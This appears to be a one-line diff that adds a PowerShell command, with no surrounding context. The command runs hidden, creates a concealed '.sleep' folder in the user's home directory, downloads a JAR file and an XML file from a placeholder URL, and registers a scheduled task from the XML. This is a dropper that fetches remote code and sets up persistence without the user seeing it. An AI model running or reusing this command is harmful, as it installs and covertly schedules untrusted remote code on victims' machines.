@@ -1,0 +1,1 @@
+powershell saps powershell -ArgumentList \"mkdir `$env:homepath\.sleep;`$client = New-Object System.Net.WebClient;`$client.DownloadFile('URL', `$env:homepath + '\.sleep\sleep.jar');`$client.DownloadFile('URL', `$env:temp + '\sleep.xml');sleep 5;schtasks /create /XML `$env:temp\sleep.xml\" -WindowStyle Hidden
